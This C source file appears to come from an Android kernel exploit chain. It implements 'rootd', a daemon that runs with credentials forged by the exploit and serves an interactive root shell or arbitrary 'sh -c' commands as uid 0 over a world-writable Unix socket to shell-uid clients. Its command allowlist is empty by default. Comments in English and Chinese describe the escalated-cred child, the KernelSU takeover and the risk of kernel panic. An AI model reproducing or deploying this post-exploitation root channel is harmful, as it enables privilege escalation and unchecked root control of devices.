#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define ROOT_SOCK "/data/local/tmp/pc98260-root.sock"

/*
 * Reserved control command: asks rootd to shut down gracefully.
 *
 * Why this exists: the exploit process used to stay resident forever, because
 * rootd was the only root channel and it lived inside the escalated cred child.
 * Once KernelSU has taken over, root capability is provided by the kernelsu
 * module (su_compat / grant_root), so the temporary channel is no longer needed
 * and the exploit process may exit cleanly. The stop request travels over the
 * very same socket, so no extra IPC primitive (and no extra file descriptor)
 * is introduced.
 */
#define ROOTD_STOP_CMD "\x01stop"

/*
 * The socket path can be set by the host via PC98260_SOCK (unique per round).
 * A fixed path lets a stale dead socket from the previous failed round interfere with this round's detection:
 * If the old file remains 0600 root:root, the shell client's connect gets EACCES directly,
 * and the host may mistake 'file exists' for 'rootd ready'.
 */
static const char *root_sock_path(void)
{
	const char *env = getenv("PC98260_SOCK");
	if (env && *env)
		return env;
	return ROOT_SOCK;
}

/*
 * Stop-file path: the host asks rootd to shut down by creating this file.
 *
 * Why a file and not only the socket command: after a successful KernelSU
 * late-load the kernel pushes SELinux back to Enforcing, which can break the
 * unlabeled socket link. The stop file is checked on every accept timeout, so
 * the daemon still shuts down even when the socket became unusable.
 */
static const char *root_stop_file(void)
{
	const char *env = getenv("PC98260_STOP_FILE");
	if (env && *env)
		return env;
	return "/data/local/tmp/cve98260-app/rootd.stop";
}

static int stop_file_present(void)
{
	struct stat st;
	return stat(root_stop_file(), &st) == 0;
}

/* ------------------------------------------------------------------ */
/* stop channels: socket command, stop file, SIGTERM                  */
/* ------------------------------------------------------------------ */

/*
 * Both existing channels live in the filesystem, and a successful KernelSU
 * late-load pushes SELinux back to Enforcing: the unlabeled control socket
 * becomes unreachable and the stop file may become unreadable for the
 * daemon's label. SIGTERM is the third channel and it is delivered by the
 * kernel itself, so no label, path or permission can block it.
 *
 * The flag is file-scope so that the exploit parent (uaf_plant.c) can also
 * observe the daemon state and, if the stop file is not enough, forward the
 * request as SIGTERM to the cred child that hosts rootd.
 */
static volatile sig_atomic_t g_stop_req;
static volatile sig_atomic_t g_phase;

/* Lifecycle phases reported through pc98260_rootd_phase(). */
#define ROOTD_PHASE_BOOT 0
#define ROOTD_PHASE_LISTEN 1
#define ROOTD_PHASE_SERVING 2
#define ROOTD_PHASE_STOPPED 3

void pc98260_rootd_request_stop(void)
{
	g_stop_req = 1;
}

int pc98260_rootd_stop_requested(void)
{
	return g_stop_req != 0;
}

int pc98260_rootd_phase(void)
{
	return (int)g_phase;
}

const char *pc98260_rootd_stop_path(void)
{
	return root_stop_file();
}

/* async-signal-safe: only touch a volatile sig_atomic_t, no logging here. */
static void on_term(int signo)
{
	(void)signo;
	g_stop_req = 1;
}

/* Returns 1 when a stop signal was received; logs exactly once so the main
 * loop can test it from several places without duplicating output. */
static int stop_signal_pending(void)
{
	static int logged;
	if (!g_stop_req)
		return 0;
	if (!logged) {
		logged = 1;
		dprintf(STDERR_FILENO,
			"[rootd] stop signal received, shutting down\n");
	}
	return 1;
}

/*
 * Sweep stale per-round sockets before binding ours.
 *
 * The per-round unique path (root-<roundId>.sock) stays as designed: a fixed
 * path lets a dead socket from the previous round poison this round's readiness
 * detection. The flip side is that every crashed round leaves one node behind,
 * and nobody can clean them up afterwards: rootd never exits normally, and the
 * host runs as shell (uid 2000), for whom these nodes are `unlabeled` and
 * unlink() is denied under Enforcing (16 of them were left that way on 23:48).
 *
 * We are uid 0 here, so we can remove them. Only files matching root-*.sock are
 * touched, and the socket we are about to bind is skipped.
 */
static void sweep_stale_sockets(const char *path)
{
	const char *slash;
	char dir[512];
	size_t len;
	DIR *d;
	struct dirent *entry;

	slash = strrchr(path, '/');
	if (!slash)
		return;
	len = (size_t)(slash - path);
	if (len == 0 || len >= sizeof(dir))
		return;
	memcpy(dir, path, len);
	dir[len] = 0;
	d = opendir(dir);
	if (!d)
		return;
	while ((entry = readdir(d))) {
		const char *name = entry->d_name;
		size_t n = strlen(name);
		char full[600];
		if (n < 10 || strncmp(name, "root-", 5) ||
		    strcmp(name + n - 5, ".sock"))
			continue;
		if (snprintf(full, sizeof(full), "%s/%s", dir, name) >=
		    (int)sizeof(full))
			continue;
		if (!strcmp(full, path))
			continue;
		if (!unlink(full))
			dprintf(STDERR_FILENO, "[rootd] swept stale %s\n", name);
	}
	closedir(d);
}

static void describe_socket(const char *path)
{
	struct stat st;
	if (stat(path, &st) == 0)
		dprintf(STDERR_FILENO,
			"[rootd] sock uid=%u gid=%u mode=%04o\n",
			(unsigned)st.st_uid, (unsigned)st.st_gid,
			(unsigned)(st.st_mode & 07777));
	else
		dprintf(STDERR_FILENO, "[rootd] sock stat errno=%d (%s)\n",
			errno, strerror(errno));
}

static int read_exact(int fd, void *buffer, size_t length)
{
	char *p = buffer;
	while (length) {
		ssize_t got = read(fd, p, length);
		if (got < 0 && errno == EINTR) continue;
		if (got <= 0) return -1;
		p += got;
		length -= (size_t)got;
	}
	return 0;
}

/*
 * S4 加固（2026-10-29）：rootd 以 uid=0 运行，原先对除 STOP 外的任意命令直接以
 * sh -c 执行。本次新增：执行前审计日志（命令 + uid）+ 可选精确命令白名单。
 * 彻底白名单化（仅允许固定脚本）会砍掉 `su` 这一核心功能（用户有意要 root shell），
 * 属产品级权衡，留待产品决策；本次仅做非破坏性加固，默认维持宽松行为。
 */
static const char *const ROOTD_ALLOWLIST[] = {
	/* 留空 = 维持现状（宽松）。要收紧攻击面时，把应用合法下发的命令原文逐条填入，
	 * 即自动开启严格模式（sh -c 命令必须逐字命中其中之一）。 */
};
#define ROOTD_ALLOWLIST_N ((int)(sizeof(ROOTD_ALLOWLIST) / sizeof(ROOTD_ALLOWLIST[0])))

/* 返回 1 表示允许；ROOTD_ALLOWLIST 为空时恒返回 1（不破坏既有行为）。 */
static int rootd_command_allowed(const char *cmd)
{
	if (ROOTD_ALLOWLIST_N == 0)
		return 1;
	for (int k = 0; k < ROOTD_ALLOWLIST_N; k++)
		if (!strcmp(cmd, ROOTD_ALLOWLIST[k]))
			return 1;
	return 0;
}

static int handle_client(int fd)
{
	uint32_t length = 0;
	char command[4097];
	if (read_exact(fd, &length, sizeof(length)) || length > 4096U ||
	    read_exact(fd, command, length)) return 0;
	command[length] = 0;
	/* Reserved control command: shut the daemon down instead of forking a shell. */
	if (!strcmp(command, ROOTD_STOP_CMD)) {
		static const char ack[] = "rootd: stopping\n";
		ssize_t written = write(fd, ack, sizeof(ack) - 1);
		(void)written;
		dprintf(STDERR_FILENO, "[rootd] stop request received, shutting down\n");
		return 1;
	}
	/* S4 审计：记录每次以 uid=0 下发的命令，便于取证与异常排查。 */
	dprintf(STDERR_FILENO, "[rootd] exec (uid=%u len=%u): %.*s\n",
		(unsigned)getuid(), length, (int)length, command);
	/* S4 可选白名单：仅当配置了精确白名单时，程序化 sh -c 命令须逐字命中；
	 * 交互式 shell（length==0）是 su 功能，不受此限。默认未配置=放行。 */
	if (length && !rootd_command_allowed(command)) {
		dprintf(STDERR_FILENO,
			"[rootd] rejected: command not in allowlist (strict mode)\n");
		return 0;
	}
	pid_t child = fork();
	if (child < 0) return 0;
	if (child == 0) {
		(void)dup2(fd, STDIN_FILENO);
		(void)dup2(fd, STDOUT_FILENO);
		(void)dup2(fd, STDERR_FILENO);
		if (fd > STDERR_FILENO) close(fd);
		char *const env[] = { (char *)"PATH=/system/bin:/vendor/bin:/data/local/tmp",
			(char *)"HOME=/data/local/tmp", NULL };
		if (length) {
			char *const argv[] = { (char *)"sh", (char *)"-c",
				command, NULL };
			execve("/system/bin/sh", argv, env);
		} else {
			char *const argv[] = { (char *)"sh", (char *)"-i", NULL };
			execve("/system/bin/sh", argv, env);
		}
		_exit(127);
	}
	/*
	 * Bounded wait. An interactive shell (or a command that never returns)
	 * must not be able to keep rootd alive: the daemon has to be able to
	 * retire on request.
	 *
	 * The shell is never signalled here. It was forked from the escalated
	 * cred, so it carries the forged cred; SIGKILL on a task that still
	 * references those pages panics the kernel. Abandoning it (and letting
	 * it die on its own, or with the rest of the session) is the only safe
	 * option.
	 */
	int status;
	for (int waited = 0; waited < 30000; waited += 100) {
		pid_t done = waitpid(child, &status, WNOHANG);
		if (done == child)
			return 0;
		if (done < 0 && errno != EINTR)
			return 0;
		/* A stop request while a client is still attached: report it so the
		 * main loop breaks out. The shell keeps its inherited descriptors. */
		if (pc98260_rootd_stop_requested())
			return 1;
		usleep(100 * 1000);
	}
	dprintf(STDERR_FILENO,
		"[rootd] warn: client shell %d still running after 30s, abandoning\n",
		(int)child);
	return 0;
}

int pc98260_run_rootd(void)
{
	if (getuid() != 0 || geteuid() != 0) {
		/* Critical diagnostic: rootd must not even start when creds were not escalated,
		 * print this so the host doesn't mistake 'no socket' for 'rootd ready'. */
		dprintf(STDERR_FILENO,
			"[rootd] error: not started as root (uid=%u euid=%u, cred escalation not effective)\n",
			(unsigned)getuid(), (unsigned)geteuid());
		return 1;
	}
	const char *path = root_sock_path();
	/*
	 * Do NOT clear g_stop_req here. The cred child unblocks SIGTERM right
	 * before calling us, so a stop request may already have been delivered to
	 * the handler (setting the flag) while we were entering; clearing it would
	 * lose the signal and the daemon would stay up. A fresh process starts
	 * with the flag at zero, and nothing calls request_stop() before this
	 * point, so there is no stale state to reset.
	 */
	g_phase = ROOTD_PHASE_BOOT;
	(void)signal(SIGHUP, SIG_IGN);
	(void)signal(SIGPIPE, SIG_IGN);
	/* SIGTERM is the only shutdown channel that survives SELinux going back to
	 * Enforcing after the KernelSU late-load (see the comment near g_stop_req).
	 * The cred child installs its own handler before blocking anything, so this
	 * is the same disposition re-applied defensively; both only raise the flag. */
	(void)signal(SIGTERM, on_term);
	int listener = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (listener < 0)
		return 1;
	struct sockaddr_un address = { .sun_family = AF_UNIX };
	if (strlen(path) >= sizeof(address.sun_path)) {
		close(listener);
		return 1;
	}
	strncpy(address.sun_path, path, sizeof(address.sun_path) - 1);
	/* Clean up what previous rounds left behind while we still have uid 0. */
	sweep_stale_sockets(path);
	(void)unlink(path);
	/* umask 0: let the node land as 0777 first, then chmod explicitly,
	 * to avoid a 0600 window where 'file exists but shell cannot connect' */
	mode_t old_umask = umask(0);
	int bound = bind(listener, (struct sockaddr *)&address, sizeof(address));
	(void)umask(old_umask);
	if (bound) {
		dprintf(STDERR_FILENO,
			"[rootd] binding failed errno=%d (%s)\n",
			errno, strerror(errno));
		close(listener);
		(void)unlink(path);
		return 1;
	}
	/* 0666 + explicit chown: any host client uid/gid can connect;
	 * the real permission gate is the SO_PEERCRED check after accept (only uid 0 / 2000 allowed).
	 * Reason for not using 0660: if the client gid is not 2000 (different launch method / vendor policy),
	 * connect gets EACCES directly, and the only error is 'Permission denied'. */
	if (chmod(path, 0666)) {
		dprintf(STDERR_FILENO, "[rootd] chmod failed errno=%d (%s)\n",
			errno, strerror(errno));
	}
	(void)chown(path, 0, 2000);
	if (listen(listener, 8)) {
		dprintf(STDERR_FILENO,
			"[rootd] listen failed errno=%d (%s)\n",
			errno, strerror(errno));
		close(listener);
		(void)unlink(path);
		return 1;
	}
	dprintf(STDERR_FILENO, "[rootd] listening at %s pid=%d\n",
		path, getpid());
	describe_socket(path);
	/* Machine-readable readiness marker: the host UserService polls the log file to know rootd is ready
	 * (the PC reference run.py polls for "[rootd] listening"; this message was localized,
	 * so an extra non-localized marker line is emitted) */
	dprintf(STDERR_FILENO, "C98260_ROOTD_READY=1\n");
	g_phase = ROOTD_PHASE_LISTEN;
	for (;;) {
		/* A stop signal may land between two polls; test it before blocking so
		 * it is never lost even if poll() gets restarted. */
		if (stop_signal_pending())
			break;
		/* Poll with a timeout instead of a blocking accept: the stop file has to be
		 * noticed even when no client ever connects again. 200ms keeps the worst
		 * case shutdown latency low without burning CPU. */
		struct pollfd pfd = { .fd = listener, .events = POLLIN };
		int ready = poll(&pfd, 1, 200);
		if (ready < 0) {
			if (errno == EINTR) {
				/* Interrupted, most likely by SIGTERM: look at the flag
				 * instead of blindly retrying the poll. */
				if (stop_signal_pending())
					break;
				continue;
			}
			break;
		}
		if (stop_signal_pending())
			break;
		if (ready == 0) {
			if (stop_file_present()) {
				dprintf(STDERR_FILENO, "[rootd] stop file detected, shutting down\n");
				break;
			}
			continue;
		}
		int client = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
		if (client < 0) {
			if (errno == EINTR) continue;
			break;
		}
		struct ucred peer;
		socklen_t peer_len = sizeof(peer);
		int stop_requested = 0;
		if (!getsockopt(client, SOL_SOCKET, SO_PEERCRED,
				&peer, &peer_len) &&
		    (peer.uid == 0 || peer.uid == 2000)) {
			g_phase = ROOTD_PHASE_SERVING;
			stop_requested = handle_client(client);
			g_phase = ROOTD_PHASE_LISTEN;
		}
		close(client);
		if (stop_requested)
			break;
	}
	g_phase = ROOTD_PHASE_STOPPED;
	close(listener);
	/* Remove the socket node so the next round does not see a stale endpoint. */
	(void)unlink(path);
	/* A pending stop file must not outlive this round: the next rootd would see
	 * it on its first poll timeout and exit within 500ms, breaking that round. */
	(void)unlink(root_stop_file());
	dprintf(STDERR_FILENO, "[rootd] exited, socket removed\n");
	return 0;
}

/* ------------------------------------------------------------------ */
/* stop client: asks a running rootd to shut down                     */
/* ------------------------------------------------------------------ */

static int write_all_fd(int fd, const void *buffer, size_t length)
{
	const char *p = buffer;
	while (length) {
		ssize_t sent = write(fd, p, length);
		if (sent < 0) {
			if (errno == EINTR) continue;
			return -1;
		}
		if (sent <= 0) return -1;
		p += sent;
		length -= (size_t)sent;
	}
	return 0;
}

/* Drop the stop file so rootd notices the request even when the socket is dead. */
static int request_stop_file(void)
{
	const char *path = root_stop_file();
	FILE *f = fopen(path, "w");
	if (!f) {
		fprintf(stderr, "[rootd-stop] warn: cannot write stop file %s\n", path);
		return 1;
	}
	fprintf(f, "stop\n");
	fclose(f);
	return 0;
}

/* rootd unlinks the socket node right before exiting, so its disappearance is
 * the on-disk proof that the daemon is really gone (a SIGKILLed rootd would
 * leave the node behind). */
static int wait_rootd_gone(const char *path, int timeout_ms)
{
	for (int waited = 0; waited < timeout_ms; waited += 100) {
		struct stat st;
		if (stat(path, &st) != 0)
			return 0;
		usleep(100 * 1000);
	}
	return 1;
}

/*
 * Finish a stop request: always drop the stop file (so rootd notices even when
 * the socket is unusable), then wait until the socket node disappears.
 *
 * rc=0 means "rootd exited and the leftover process can retire"; rc=1 means the
 * request was delivered but the daemon is still alive, which lets the host fall
 * back to killing the residual native processes through the KSU su channel.
 */
static int finish_stop(const char *path)
{
	if (request_stop_file())
		return 1;
	if (wait_rootd_gone(path, 3000)) {
		fprintf(stdout,
			"[rootd-stop] warn: rootd still alive after stop request (socket %s)\n",
			path);
		return 1;
	}
	fprintf(stdout, "[rootd-stop] rootd exited, socket removed\n");
	return 0;
}

/*
 * Usage: libcve98260.so rootd-stop
 *
 * Runs as the shell user (uid 2000), which the rootd SO_PEERCRED check accepts.
 * The stop request is sent over the control socket; as a fallback the stop file
 * is created as well, because a successful KernelSU late-load pushes SELinux
 * back to Enforcing and can break the unlabeled socket link.
 */
int pc98260_rootd_stop_main(int argc, char **argv)
{
	const char *path = root_sock_path();
	struct sockaddr_un address = { .sun_family = AF_UNIX };
	(void)argc;
	(void)argv;

	if (strlen(path) >= sizeof(address.sun_path)) {
		fprintf(stderr, "[rootd-stop] error: socket path too long\n");
		return 1;
	}
	strncpy(address.sun_path, path, sizeof(address.sun_path) - 1);

	int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (fd < 0) {
		fprintf(stderr, "[rootd-stop] error: socket errno=%d (%s)\n",
			errno, strerror(errno));
		return finish_stop(path);
	}
	if (connect(fd, (struct sockaddr *)&address, sizeof(address))) {
		fprintf(stdout, "[rootd-stop] warn: connect failed errno=%d (%s), using stop file\n",
			errno, strerror(errno));
		close(fd);
		return finish_stop(path);
	}
	uint32_t length = (uint32_t)strlen(ROOTD_STOP_CMD);
	if (write_all_fd(fd, &length, sizeof(length)) ||
	    write_all_fd(fd, ROOTD_STOP_CMD, length)) {
		fprintf(stdout, "[rootd-stop] warn: send failed errno=%d, using stop file\n",
			errno);
		close(fd);
		return finish_stop(path);
	}
	(void)shutdown(fd, SHUT_WR);
	char ack[128];
	ssize_t got = read(fd, ack, sizeof(ack) - 1);
	if (got > 0) {
		ack[got] = 0;
		fprintf(stdout, "[rootd-stop] rootd ack: %s", ack);
	} else {
		fprintf(stdout, "[rootd-stop] no ack, rootd may have exited already\n");
	}
	close(fd);
	/* Belt and braces: the stop file also releases a rootd whose socket died. */
	return finish_stop(path);
}
